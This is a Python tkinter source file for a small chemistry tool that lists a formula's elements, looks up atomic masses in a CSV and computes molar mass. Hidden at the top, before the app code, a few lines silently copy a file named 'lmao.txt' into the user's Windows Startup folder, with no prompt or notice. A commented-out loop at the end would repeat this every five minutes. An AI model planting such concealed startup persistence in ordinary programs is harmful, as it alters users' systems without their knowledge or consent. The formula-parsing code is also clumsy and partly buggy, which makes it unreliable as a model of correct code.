import time
import os
import shutil
import getpass
import tkinter as tk

username = getpass.getuser()
dir_path = os.path.dirname(os.path.realpath(__file__))
place_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' %username
filee = '%s\lmao.txt' %dir_path
shutil.copy(filee, place_path)

import csv

def remove_values_from_list(the_list, val):
   return [value for value in the_list if value != val]


def metoda():
    element=entry.get()
    outputText.config(state="normal")
    outputText.delete('1.0', tk.END)
    element = element[::-1]
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digit = "0123456789"
    niz = ""
    seznam = []
    stetje = 0
    prejsnja = ""
    multiplyer = 0
    for crke in element:
      if crke in digit and prejsnja in digit:
          multiplyer = str(multiplyer)
          multiplyer += crke
          multiplyer = int(multiplyer)
      elif crke in digit and prejsnja not in digit:
        multiplyer = int(crke)
      elif crke not in lowercase:
        niz += crke
        if multiplyer>1:
          if multiplyer > 9:
            multiplyer = str(multiplyer)
            multiplyer = multiplyer[::-1]
            multiplyer = int(multiplyer)
          while stetje!=multiplyer:
            seznam.append(niz[::-1])
            stetje += 1
          stetje = 0
        else:
          seznam.append(niz[::-1])
        niz = ""
        multiplyer = 0
      elif crke in lowercase:
        niz += crke
    
    printed = []
    for i in seznam:
        stevec=0
        for j in seznam:
            if i==j:
                stevec += 1
        seznam = remove_values_from_list(seznam, i)
        if i not in printed:
            outputText.insert(tk.INSERT, (i + "(" + str(stevec) + ")"))
            printed.append(i)
    outputText.config(state="disabled")

def izpisiAtomskoMaso():
    element=entry.get()
    outputText.config(state="normal")
    outputText.delete('1.0', tk.END)
    with open("main.csv", "r") as csv_file:
        csv_reader = csv.reader(csv_file)
        for lines in csv_reader:
            if element in lines:
                outputText.insert(tk.INSERT, lines[-1])
    outputText.config(state="disabled")

def izpisiMolskoMaso():
    outputText.config(state="normal")
    outputText.delete('1.0', tk.END)
    element = entry.get()
    stetje = 0
    element = element[::-1]
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digit = "0123456789"
    niz = ""
    seznam = []
    stetje = 0
    prejsnja = ""
    multiplyer = 0
    for crke in element:
      if crke in digit and prejsnja in digit:
          multiplyer = str(multiplyer)
          multiplyer += crke
          if multiplyer[0] == "0":
              multiplyer += "0"
          multiplyer = int(multiplyer)
          multiplyer = int(multiplyer)
      elif crke in digit and prejsnja not in digit:
        multiplyer = int(crke)
      elif crke not in lowercase:
        niz += crke
        if multiplyer>1:
          if multiplyer > 9:
            multiplyer = str(multiplyer)
            multiplyer = multiplyer[::-1]
            multiplyer = int(multiplyer)
          while stetje!=multiplyer:
            seznam.append(niz[::-1])
            stetje += 1
          stetje = 0
        else:
          seznam.append(niz[::-1])
        niz = ""
        multiplyer = 0
      elif crke in lowercase:
        niz += crke
    with open("main.csv", "r") as csv_file:
        csv_reader = csv.reader(csv_file)
        for lines in csv_reader:
            for item in seznam:
                if item in lines:
                    stetje += float(lines[-1])
        outputText.insert(tk.INSERT, (str(stetje) + " g/mol"))
        outputText.config(state="disabled")

#main root
root = tk.Tk()
root.geometry("500x500")
root.resizable(width=False, height=False)

#spacing frames
spFrLevo=tk.Frame(width=50, height=500, bg="#7f8c8d") #left
spFrLevo.grid(row=0, rowspan=7, column=0)
spFrLevo.configure(height=spFrLevo["height"],width=spFrLevo["width"])
spFrLevo.pack_propagate(0)

spFrDesno=tk.Frame(width=50, height=500, bg="#7f8c8d") #right
spFrDesno.grid(row=0, rowspan=7, column=3)
spFrDesno.configure(height=spFrDesno["height"],width=spFrDesno["width"])
spFrDesno.pack_propagate(0)

spFrUp=tk.Frame(width=400, height=50, bg="#7f8c8d") #top middle
spFrUp.grid(row=0, columnspan=2, column=1)
spFrUp.configure(height=spFrUp["height"],width=spFrUp["width"])
spFrUp.pack_propagate(0)

spFrMid=tk.Frame(width=400, height=10, bg="#7f8c8d") #med entry/buttons
spFrMid.grid(row=2, columnspan=2, column=1)
spFrMid.configure(height=spFrMid["height"],width=spFrMid["width"])
spFrMid.pack_propagate(0)

spFrMid2=tk.Frame(width=400, height=10, bg="#7f8c8d") #med output/buttons
spFrMid2.grid(row=4, columnspan=2, column=1)
spFrMid2.configure(height=spFrMid2["height"],width=spFrMid2["width"])
spFrMid2.pack_propagate(0)

spFrBottom=tk.Frame(width=400, height=50, bg="#7f8c8d") #bottom
spFrBottom.grid(row=6, columnspan=2, column=1)
spFrBottom.configure(height=spFrBottom["height"],width=spFrBottom["width"])
spFrBottom.grid_propagate(0)

#frame za entry box
frameEntry = tk.Frame(width=400, height=50, bg="#95a5a6") #entry
frameEntry.grid(row=1, columnspan=2, column=1)
frameEntry.configure(height=frameEntry["height"],width=frameEntry["width"])
frameEntry.grid_propagate(0)

#entry
v = ""
entry = tk.Entry(frameEntry, width=50, justify="center", textvariable=v)
entry.place(relx=0.5, rely=0.5, anchor="center")

#output box
frameOutput = tk.Frame(width=400, height=50, bg="#95a5a6")#output
frameOutput.grid(row=5, columnspan=2, column=1)
frameOutput.configure(height=frameOutput["height"],width=frameOutput["width"])
frameOutput.grid_propagate(0)

outputText = tk.Text(frameOutput, width=40, height=1, bg="#95a5a6", bd=0, state="disabled") #output text
outputText.place(relx=0.5, rely=0.5, anchor="center")

#frame za button
frameButtons = tk.Frame(width=400, height=280, bg="#95a5a6") #buttons
frameButtons.grid(row=3, columnspan=2, column=1)
frameButtons.configure(height=frameButtons["height"],width=frameButtons["width"])
frameButtons.grid_propagate(0)

nal1 = tk.Button(frameButtons, text="Elements in the compound", width=15, height=5, wraplength=60, command=metoda, bg="#bdc3c7")
nal1.place(relx=0.155, rely=0.175, anchor="center")

nal2 = tk.Button(frameButtons, text="Return atomic mass", width=15, height=5, wraplength=60, command=izpisiAtomskoMaso, bg="#bdc3c7")
nal2.place(relx=0.155, rely=0.5, anchor="center")

nal3 = tk.Button(frameButtons, text="Calculate the molecular mass", width=15, height=5, wraplength=60, command=izpisiMolskoMaso, bg="#bdc3c7")
nal3.place(relx=0.155, rely=0.825, anchor="center")

delButton = tk.Button(spFrBottom, text="Shutdown", command=root.destroy, bg="#bdc3c7")
delButton.place(relx=0.5, rely=0.5, anchor="center")

root.mainloop()


""" while True:
    time.sleep(5*60)
    shutil.copy(dir_path, place_path,) """